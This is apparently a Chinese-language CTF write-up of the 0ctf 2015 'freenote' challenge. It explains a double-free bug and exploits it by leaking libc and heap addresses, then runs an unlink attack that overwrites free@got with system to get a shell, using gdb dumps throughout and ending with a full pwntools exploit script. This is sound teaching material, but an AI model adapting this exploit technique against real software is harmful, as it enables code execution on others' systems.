---
title: CTF | 0ctf 2015 freenote writeup
date: 2018-08-16 18:57:34
tags: pwn
categories: CTF
---
`0ctf 2015 freenote writeup`
涉及到 `double free` 漏洞，利用过程：`leak libc ,leak heap, unlink` 

<!-- more -->
做题比写论文好玩多了呜呜呜呜
这个也是很经典的一道题啦，主要就是 `leak libc ,leak heap, unlink `这三步
### 程序分析
首先弄一下结构体
大概就是这样吧：
```python
00000000 chunk           struc ; (sizeof=0x18, mappedto_8)
00000000                                         ; XREF: chunk_list/r
00000000 flag            dq ?
00000008 size            dq ?
00000010 ptr             dq ?
00000018 chunk           ends
00000018
00000000 ; ---------------------------------------------------------------------------
00000000
00000000 chunk_list      struc ; (sizeof=0x1810, mappedto_9)
00000000 head            dq ?
00000008 num             dq ?
00000010 chunksptr       chunk 256 dup(?)
00001810 chunk_list      ends
```
#### initptr
首先进行初始化，`malloc` 出 `0x1810` 大小的 `chunk` 用来管理堆块,我们把这个 `chunk` 命名为 `table`
结构大概是这样的:  
`ptr | chunknum | chunk[256]`
`chunk 的结构是这样： |flag|size|ptr|`
初始化把 `flag、size、ptr` 都置为 `0` 
#### new
size 大小最小是 `0x80`  再加个 `header` 就是 `0x90`
`(0x80 - size % 0x80) % 0x80 + size)`
#### edit
编辑堆块信息，如果 `size` 改变，会通过 `realloc` 新分配堆块

#### delete
这里有个` double free` 漏洞
#### list
输出堆块信息

### 利用思路
利用 `double free `
#### leak libc
`free` 掉 `0x90` 大小的堆块，会放入` unsorted bin` 中，添加 `fd,bk`信息。我们在 `malloc` 出来，仅修改低字节，因为 `libc` 中偏移不变，所以地址的低字节应该是不变的，`\x78` 是固定的。 泄露 `fd` 地址.. 计算得到 `libc` 基址

#### leak heap
使 `unsorted bin` 中 第一块的 bk 指向下一个 `free` 掉的 `chunk` ，泄露bk,得到 `heap` 地址
#### unlink
 `free` 一个堆块放入 `unsorted bin`，会检查后向合并，我们构造 `fake chunk`，伪造 `fd,bk`。从而达到 `ptr[0] = &ptr[0]-0x18` 的效果
### 利用过程
#### 泄露 libc 地址
首先 `new` 两个 `0x80` 的 `chunk`
```c
gef➤  x/16gx 0x00000000019c3000
0x19c3000:	0x0000000000000000	0x0000000000001821  => table header
0x19c3010:	0x0000000000000100	0x0000000000000002 
0x19c3020:	0x0000000000000001	0x0000000000000080 => chunk 0 flag | size
0x19c3030:	0x00000000019c4830	0x0000000000000001 => chunk 0 ptr | chunk 1 flag
0x19c3040:	0x0000000000000080	0x00000000019c48c0 => chunk 1 size | chunk 1 ptr
0x19c3050:	0x0000000000000000	0x0000000000000000
```
看一下这两个 `chunk` 的信息：
```c
gef➤  x/32gx 0x00000000019c4830-0x10
0x19c4820:	0x0000000000000000	0x0000000000000091 => chunk 0 header
0x19c4830:	0x4141414141414141	0x4141414141414141
......
0x19c48b0:	0x0000000000000000	0x0000000000000091 => chunk 1 header
0x19c48c0:	0x4242424242424242	0x4242424242424242
...... 
0x19c4910:	0x4242424242424242	0x4242424242424242
```
`delete chunk 0` 写入 `fd, bk`
```c
gef➤  x/16gx 0x120d830-0x10
0x120d820:	0x0000000000000000	0x0000000000000091 => chunk 0 header
0x120d830:	0x00007fd22ca79b78	0x00007fd22ca79b78 => fd | bk
0x120d840:	0x4141414141414141	0x4141414141414141
0x120d850:	0x4141414141414141	0x4141414141414141
```
`new note('\x78')` 将刚刚 `free` 掉的` chunk 0` `malloc` 出来
可以看到` fd,bk `并没有修改，我们就可以通过 `list` 得到地址了
```c 
gef➤  x/16gx 0x1f66830-0x10
0x1f66820:	0x0000000000000000	0x0000000000000091
0x1f66830:	0x00007f307c0b5b78	0x00007f307c0b5b78 => fd | bk
0x1f66840:	0x4141414141414141	0x4141414141414141
```
查看一下 `libc` 地址和 `fd`:
```c
gef➤  vmmap libc
Start              End                Offset             Perm Path
0x00007fd22c6b5000 0x00007fd22c875000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so
.....
gef➤  x/16gx 0x00007fd22ca79b78
0x7fd22ca79b78 <main_arena+88>:	0x000000000120d940	0x0000000000000000
0x7fd22ca79b88 <main_arena+104>:	0x000000000120d820	0x000000000120d820
```
我们可以计算 `hex(libc基址-fd)` 即 `hex(0x00007fd22ca79b78-0x00007fd22c6b5000)` 得到 `0x3c4b78`，当然这个值就是 `main_arena` 偏移 +`88` 

之后我们` delete chunk 1;delete chunk 0 ;`会和 `top chunk` 合并
此时堆布局,可以看到 `chunk 0` 和 `chunk 1 `的 `ptr` 还在
```c
gef➤  x/32gx 0x000000000116b000
0x116b000:	0x0000000000000000	0x0000000000001821
0x116b010:	0x0000000000000100	0x0000000000000000
0x116b020:	0x0000000000000000	0x0000000000000000
0x116b030:	0x000000000116c830	0x0000000000000000 => chunk 0 ptr
0x116b040:	0x0000000000000000	0x000000000116c8c0 => chunk 1 ptr
0x116b050:	0x0000000000000000	0x0000000000000000 
0x116b060:	0x0000000000000000	0x0000000000000000
......
top chunk
```
#### 泄露 heap 地址
泄露 `heap` 地址，是在 `unsorted bin` 中构造链，泄露 `unsorted bin` 中第一个 `chunk` 的`fd`,这时是指向下一个堆块的。泄露下一个堆块的地址，也就得到了 `heap` 地址。但是注意构造 `chunk` 时，要避免它们进行合并。

```python
new_note("A"*notelen)#0
new_note("B"*notelen)
new_note("C"*notelen)
new_note("D"*notelen)
```
此时堆块信息
```python
gef➤  heap chunks
Chunk(addr=0x11e7010, size=0x1820, flags=PREV_INUSE)
    [0x00000000011e7010     00 01 00 00 00 00 00 00 04 00 00 00 00 00 00 00     ................]
Chunk(addr=0x11e8830, size=0x90, flags=PREV_INUSE)
    [0x00000000011e8830     41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41     AAAAAAAAAAAAAAAA]
Chunk(addr=0x11e88c0, size=0x90, flags=PREV_INUSE)
    [0x00000000011e88c0     42 42 42 42 42 42 42 42 42 42 42 42 42 42 42 42     BBBBBBBBBBBBBBBB]
Chunk(addr=0x11e8950, size=0x90, flags=PREV_INUSE)
    [0x00000000011e8950     43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43     CCCCCCCCCCCCCCCC]
Chunk(addr=0x11e89e0, size=0x90, flags=PREV_INUSE)
    [0x00000000011e89e0     44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44     DDDDDDDDDDDDDDDD]
Chunk(addr=0x11e8a70, size=0x205a0, flags=PREV_INUSE)  ←  top chunk
```
看一下 `table` 的记录：
```c
gef➤  x/16gx 0x11e7010-0x10
0x11e7000:	0x0000000000000000	0x0000000000001821 => table header
0x11e7010:	0x0000000000000100	0x0000000000000004 => max | num
0x11e7020:	0x0000000000000001	0x0000000000000080 
0x11e7030:	0x00000000011e8830	0x0000000000000001 => chunk 0 ptr = 0x00000000011e8830
0x11e7040:	0x0000000000000080	0x00000000011e88c0 => chunk 1 ptr = 0x00000000011e88c0
0x11e7050:	0x0000000000000001	0x0000000000000080
0x11e7060:	0x00000000011e8950	0x0000000000000001 => chunk 2 ptr
0x11e7070:	0x0000000000000080	0x00000000011e89e0 => chunk 3 ptr
```
此时 bins 中是没有 chunk 的。
`chunk 1` 和` chunk 3 `主要就是用来防止堆块合并的，这样我们才能在 unsorted bin 中成功构造链表

```c
delete_note(2)
delete_note(0)
```

此时看一下 `unsorted bin`
```c
[+] unsorted_bins[0]: fw=0x11e8820, bk=0x11e8940
 →   Chunk(addr=0x11e8830, size=0x90, flags=PREV_INUSE)   →   Chunk(addr=0x11e8950, size=0x90, flags=PREV_INUSE)
```
链表中：`unsorted bin | chunk 0 | chunk 2 `
大致是这样 `unsorted bin` 的 `fd` 指向下一个，也就是 `chunk 0`,`bk` 指向前一个，也就是 `chunk 2`
我们来看一下 `chunk 0` 和 `chunk 2` 的信息：
```c
gef➤  x/16gx 0x11e8830-0x10
0x11e8820:	0x0000000000000000	0x0000000000000091
0x11e8830:	0x00000000011e8940	0x00007f30b78c1b78 => chunk 0的 fd 指向 chunk 2,bk 指向 unsorted Bin 头。
0x11e8840:	0x4141414141414141	0x4141414141414141
0x11e8850:	0x4141414141414141	0x4141414141414141
0x11e8860:	0x4141414141414141	0x4141414141414141
gef➤  x/16gx 0x00000000011e8940
0x11e8940:	0x0000000000000000	0x0000000000000091
0x11e8950:	0x00007f30b78c1b78	0x00000000011e8820 => chunk 2 的 fd 指向 unsorted bin 头，bk 指向 chunk0. 
0x11e8960:	0x4343434343434343	0x4343434343434343
0x11e8970:	0x4343434343434343	0x4343434343434343

```
我们在 `malloc` 一下，就会将 `chunk 2` 分配出来，泄露 `chunk 2` 的 `bk` 就可以了。

可以来看一下：（在这里重新跑了一下脚本，chunk 的地址变了，不过不影响理解）
目前 `chunk` 的 `ptr` 如下...
```c
gef➤  x/16gx 0x14d6010
0x14d6010:	0x0000000000000100	0x0000000000000002
0x14d6020:	0x0000000000000000	0x0000000000000000
0x14d6030:	0x00000000014d7830	0x0000000000000001
0x14d6040:	0x0000000000000080	0x00000000014d78c0
0x14d6050:	0x0000000000000000	0x0000000000000000
0x14d6060:	0x00000000014d7950	0x0000000000000001
0x14d6070:	0x0000000000000080	0x00000000014d79e0
0x14d6080:	0x0000000000000000	0x0000000000000000
```
此时 `chunk 2` 的信息：
```c
gef➤  x/16gx 0x00000000014d7950-0x10
0x14d7940:	0x0000000000000000	0x0000000000000091
0x14d7950:	0x4141414141414141	0x00000000014d7820 => bk !
0x14d7960:	0x4343434343434343	0x4343434343434343
0x14d7970:	0x4343434343434343	0x4343434343434343
0x14d7980:	0x4343434343434343	0x4343434343434343
```
泄露出来的 `0x00000000014d7820` 就是 `chunk 0` 地址了，当然可以通过计算 `size` 得到 `heap` 基址，也就是 `table chunk` 的地址。但是也可以通过
计算 chunk0-heap 基址得到固定的偏移就好了。
```c
>>> hex(0x00000000014d7820-0x00000000014d6000)
'0x1820'
```
接下来再通过
```c
delete_note(0)
delete_note(1)
delete_note(3)
```
把 `chunk` 都清理掉，并入 `top chunk`.

#### unlink
接下来 进行 `unlink` 操作。
```python
new_note("A"*notelen)
new_note("B"*notelen)
new_note("C"*notelen)
```
首先 new 三个 chunk
```c
gef➤  x/16gx 0x14d6010-0x10
0x14d6000:	0x0000000000000000	0x0000000000001821
0x14d6010:	0x0000000000000100	0x0000000000000003
0x14d6020:	0x0000000000000001	0x0000000000000080
0x14d6030:	0x00000000014d7830	0x0000000000000001 => chunk 0 ptr 
0x14d6040:	0x0000000000000080	0x00000000014d78c0 => chunk 1 ptr
0x14d6050:	0x0000000000000001	0x0000000000000080
0x14d6060:	0x00000000014d7950	0x0000000000000000 => chunk 2 ptr
0x14d6070:	0x0000000000000000	0x00000000014d79e0 => 这是因为 ptr 没清空剩下的
```
在 `delete chunk 2, delete chunk 1，delete chunk 0 `
然后都并入 `top chunk 了`..
```c
gef➤   x/16gx 0x14d6010-0x10
0x14d6000:	0x0000000000000000	0x0000000000001821
0x14d6010:	0x0000000000000100	0x0000000000000000
0x14d6020:	0x0000000000000000	0x0000000000000000
0x14d6030:	0x00000000014d7830	0x0000000000000000 => chunk 0 ptr
0x14d6040:	0x0000000000000000	0x00000000014d78c0 => chunk 1 ptr
0x14d6050:	0x0000000000000000	0x0000000000000000
0x14d6060:	0x00000000014d7950	0x0000000000000000 => chunk 2 ptr
0x14d6070:	0x0000000000000000	0x00000000014d79e0 => chunk 3 ptr
```

前面泄露得到` chunk 0` 的 `ptr`,而 构造时应使 `fd = &p-0x18;bk = &p-0x10`
伪造 `fake chunk`,`malloc`  一个比较大的堆块，会覆盖原来 `chunk` 的地方，而原来 `chunk` 还可以进行 `free` 操作，因此可以利用 `unlink。大概` `chunk overlapping `
构造时要注意三个地方：`chunk 1 header` 中的 `pre_size`  以及 `Pre_inuse` 、`chunk 2` 中的 `pre_inuse` 要设为 0
```c
gef➤  x/32gx 0x14d7830-0x10
0x14d7820:	0x0000000000000000	0x0000000000000191 
0x14d7830:	0x0000000000000000	0x0000000000000081 => fake chunk header
0x14d7840:	0x00000000014d6018	0x00000000014d6020 => fake fd bk
0x14d7850:	0x4141414141414141	0x4141414141414141
0x14d7860:	0x4141414141414141	0x4141414141414141
0x14d7870:	0x4141414141414141	0x4141414141414141
0x14d7880:	0x4141414141414141	0x4141414141414141
0x14d7890:	0x4141414141414141	0x4141414141414141
0x14d78a0:	0x4141414141414141	0x4141414141414141
0x14d78b0:	0x0000000000000080	0x0000000000000090 => fake header chunk 1,fake chunk 0 size = 0x80,fake pre_inuse 
0x14d78c0:	0x4141414141414141	0x4141414141414141
0x14d78d0:	0x4141414141414141	0x4141414141414141
0x14d78e0:	0x4141414141414141	0x4141414141414141
0x14d78f0:	0x4141414141414141	0x4141414141414141
0x14d7900:	0x4141414141414141	0x4141414141414141
0x14d7910:	0x4141414141414141	0x4141414141414141
gef➤  
0x14d7920:	0x4141414141414141	0x4141414141414141
0x14d7930:	0x4141414141414141	0x4141414141414141
0x14d7940:	0x0000000000000000	0x0000000000000091 => fake header  fake pre_inuse = 1
0x14d7950:	0x0000000000000000	0x0000000000000000
0x14d7960:	0x0000000000000000	0x0000000000000000
0x14d7970:	0x0000000000000000	0x0000000000000000
0x14d7980:	0x0000000000000000	0x0000000000000000
0x14d7990:	0x0000000000000000	0x0000000000000000
0x14d79a0:	0x0000000000000000	0x0000000000000000
0x14d79b0:	0x4343434343434343	0x0000000000020651  => top chunk 
0x14d79c0:	0x4343434343434343	0x4343434343434343
0x14d79d0:	0x00000000000001b0	0x0000000000020631 
0x14d79e0:	0x4444444444444444	0x4444444444444444
```
此时 `ptr table`:
```c
gef➤  x/16gx 0x00000000014d6000
0x14d6000:	0x0000000000000000	0x0000000000001821
0x14d6010:	0x0000000000000100	0x0000000000000001
0x14d6020:	0x0000000000000001	0x0000000000000180
0x14d6030:	0x00000000014d7830	0x0000000000000000
0x14d6040:	0x0000000000000000	0x00000000014d78c0
0x14d6050:	0x0000000000000000	0x0000000000000000
0x14d6060:	0x00000000014d7950	0x0000000000000000
0x14d6070:	0x0000000000000000	0x00000000014d79e0
```
如果此时我们 `delete 1` 就会判断 `pre_insue` 等位，与前面的 `chunk 0 `进行合并。得到` 0x80+0x9`0 大小的 `bin`，放到 `unsorted bin`中。 合并的时候进行了 `unlink` 操作，`chunk 0` 的 `ptr` 修改成了 `&ptr[0]-0x18` 的地方。
```c 
gef➤  x/16gx 0x00000000014d6000
0x14d6000:	0x0000000000000000	0x0000000000001821
0x14d6010:	0x0000000000000100	0x0000000000000000
0x14d6020:	0x0000000000000001	0x0000000000000180 =>chunk 0 flag | chunk 0 size 
0x14d6030:	0x00000000014d6018	0x0000000000000000 => ptr[0] = &ptr[0]-0x18
0x14d6040:	0x0000000000000000	0x00000000014d78c0
0x14d6050:	0x0000000000000000	0x0000000000000000
0x14d6060:	0x00000000014d7950	0x0000000000000000
0x14d6070:	0x0000000000000000	0x00000000014d79e0
```
这个时候就很简单啦
我们 `edit chunk 0`,就是修改 `&ptr[0]-0x18 `指向的内容，可以修改 `ptr[0]`之类的   
写入内容 `：p64(notelen) + p64(1) + p64(0x8) + p64(free_got) + "A"*16 + p64(binsh_addr)`    
就把 `ptr[0]`改为了 `free_got`,同时将 `chunk 0` 的 `flag` 设为 `1，size` 设为 `0x8`; 否则下次 `edit` `时，size` 不匹配会进行 `realloc`。将 `chunk 1 ptr` 改为 `/bin/sh` 字符串的地址
可以来看一下写入的内容  
```c
gef➤  x/16gx 0x14d6010
0x14d6010:	0x0000000000000100	0x0000000000000080
0x14d6020:	0x0000000000000001	0x0000000000000008
0x14d6030:	0x0000000000602018	0x4141414141414141 
0x14d6040:	0x4141414141414141	0x00007f13b0022d57 
0x14d6050:	0x4141414141414141	0x4141414141414141
0x14d6060:	0x4141414141414141	0x4141414141414141
0x14d6070:	0x4141414141414141	0x4141414141414141
gef➤  x/16gx 0x0000000000602018
0x602018 <free@got.plt>:	0x00007f13aff1a4f0	0x00007f13aff05690
gef➤  x/16s 0x00007f13b0022d57
0x7f13b0022d57:	"/bin/sh"  
```

通过 `edit 0`，将 `free_got` 改为 `system` 地址，在` free(1)` ，相当于调用了 `system("/bin/sh")`


最终`payload`:

```python
#!/usr/bin/env python
from pwn import *

p = process('./freenote')

libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')

def new_note(x):
    p.recvuntil("Your choice: ")
    p.send("2\n")
    p.recvuntil("Length of new note: ")
    p.send(str(len(x))+"\n")
    p.recvuntil("Enter your note: ")
    p.send(x)

def delete_note(x):
    p.recvuntil("Your choice: ")
    p.send("4\n")
    p.recvuntil("Note number: ")
    p.send(str(x)+"\n")

def list_note():
    p.recvuntil("Your choice: ")
    p.send("1\n")
    
def edit_note(x,y):
    p.recvuntil("Your choice: ")
    p.send("3\n")   
    p.recvuntil("Note number: ")
    p.send(str(x)+"\n")   
    p.recvuntil("Length of note: ")
    p.send(str(len(y))+"\n")   
    p.recvuntil("Enter your note: ")
    p.send(y)
    
####################leak libc#########################

notelen=0x80

new_note("A"*notelen)
new_note("B"*notelen)
delete_note(0)

new_note("\x78")
#gdb.attach(p)
list_note()
p.recvuntil("0. ")
leak = p.recvuntil("\n")
print leak[0:-1].encode('hex')
leaklibcaddr = u64(leak[0:-1].ljust(8, '\x00'))
print hex(leaklibcaddr)
delete_note(1)
delete_note(0)

libc_base_addr = leaklibcaddr - 0x3c4b78
print "libc_base: " + hex(libc_base_addr)

system_sh_addr = libc_base_addr + libc.symbols['system']
print "system_sh_addr: " + hex(system_sh_addr)

binsh_addr = libc_base_addr + next(libc.search('/bin/sh'))
print "binsh_addr: " + hex(binsh_addr)


####################leak heap#########################

notelen=0x80

new_note("A"*notelen)#0
new_note("B"*notelen)
new_note("C"*notelen)
new_note("D"*notelen)
delete_note(2)
delete_note(0)

#gdb.attach(p)
#raw_input()
new_note("AAAAAAAA")
list_note()
p.recvuntil("0. AAAAAAAA")
leak = p.recvuntil("\n")

print leak[0:-1].encode('hex')
leakheapaddr = u64(leak[0:-1].ljust(8, '\x00'))

print "leakheapaddr: "+hex(leakheapaddr)

#raw_input()
delete_note(0)
delete_note(1)
delete_note(3)

####################unlink exp#########################

notelen = 0x80

new_note("A"*notelen)
new_note("B"*notelen)
new_note("C"*notelen)

delete_note(2)
delete_note(1)
delete_note(0)

fd = leakheapaddr - 0x1808
bk = fd + 0x8


#gdb.attach(p)

payload  = ""
payload += p64(0x0) + p64(notelen+1) + p64(fd) + p64(bk) + "A" * (notelen - 0x20)
payload += p64(notelen) + p64(notelen+0x10) + "A" * notelen
payload += p64(0) + p64(notelen+0x11)+ "\x00" * (notelen-0x20)

new_note(payload)

delete_note(1)

free_got = 0x602018

payload2 = p64(notelen) + p64(1) + p64(0x8) + p64(free_got) + "A"*16 + p64(binsh_addr)
payload2 += "A"* (notelen*3-len(payload2)) 

edit_note(0, payload2)
edit_note(0, p64(system_sh_addr))

delete_note(1)

p.interactive()

```

### 参考资料
http://angelboy.logdown.com/posts/259180-0ctf-2015-write-up
https://blog.csdn.net/qq_33528164/article/details/80085926
https://kitctf.de/writeups/0ctf2015/freenote




